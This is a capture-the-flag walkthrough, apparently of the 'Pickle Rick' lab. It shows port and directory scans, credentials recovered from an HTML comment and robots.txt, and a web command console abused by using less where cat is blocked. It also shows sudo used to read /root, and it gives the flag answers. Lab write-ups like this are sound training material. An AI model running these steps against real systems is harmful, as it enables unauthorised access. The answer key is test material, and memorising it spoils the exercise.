# Pickle Rick

Laurent Chauvin | October 30, 2022

## Resources

## Progress

export IP=10.10.73.227

nmap scan:
```
nmap -sC -sV -oN nmap/initial $IP

Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-30 17:43 EDT
Nmap scan report for 10.10.73.227
Host is up (0.10s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:97:24:25:65:58:66:2a:4e:60:18:82:80:c0:44:2c (RSA)
|   256 d0:a6:3e:90:f3:c5:f0:82:56:49:b3:19:51:89:43:34 (ECDSA)
|_  256 7c:a6:93:24:1b:78:0c:95:57:1e:f8:9d:8f:aa:cc:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.21 seconds

```

Examining HTML source code reveal:

```
<!--Note to self, remember username! Username: R1ckRul3s-->
```

Run gobuster:
```
gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.73.227
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/10/30 17:47:33 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 313] [--> http://10.10.73.227/assets/]
/server-status        (Status: 403) [Size: 300]
Progress: 220532 / 220561 (99.99%)===============================================================
2022/10/30 18:26:21 Finished
===============================================================
```

Run Nikto:
```
nikto -h "http://10.10.73.227" | tee nikto.log

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.73.227
+ Target Hostname:    10.10.73.227
+ Target Port:        80
+ Start Time:         2022-10-30 17:51:01 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Cookie PHPSESSID created without the httponly flag
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 7889 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2022-10-30 18:06:10 (GMT-4) (909 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Accessing robots.txt yields:
```
Wubbalubbadubdub
```

Found a webpage:
```
http://10.10.73.227/login.php
```

Testing with R1ckRul3s, and password Wubbalubbadubdub.
Login granted.

Run commands on webconsole:
```
ls

Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

```
cat Sup3rS3cretPickl3Ingred.txt

Command disabled to make it hard for future PICKLEEEE RICCCKKKK.
```

After testing found disabled commands:

```
cat, more
```

Command ```less``` seems to work.

First flag:
```
less Sup3rS3cretPickl3Ingred.txt

mr. meeseek hair
```

```
less clue.txt

Look around the file system for the other ingredient.
```

```pwd``` seems to indicate we are in ```/var/www/html```.

Let's check 'rick' home folder.

```
ls -al /home/rick

total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
```

Found second ingredient:
```
less /home/rick/second\ ingredients

1 jerry tear
```

```sudo``` commands seems to work.

/root dir has:

```
sudo ls -al /root

total 28
drwx------  4 root root 4096 Feb 10  2019 .
drwxr-xr-x 23 root root 4096 Oct 30 21:41 ..
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Feb 10  2019 .ssh
-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
drwxr-xr-x  3 root root 4096 Feb 10  2019 snap
```

Finally:
```
sudo less /root/3rd.txt

3rd ingredients: fleeb juice
```

## Flag

1. What is the first ingredient Rick needs?

```
mr. meeseek hair
```

2. What is the second ingredient Rick needs?

```
1 jerry tear
```

3. What is the third ingredient Rick needs?

```
fleeb juice
```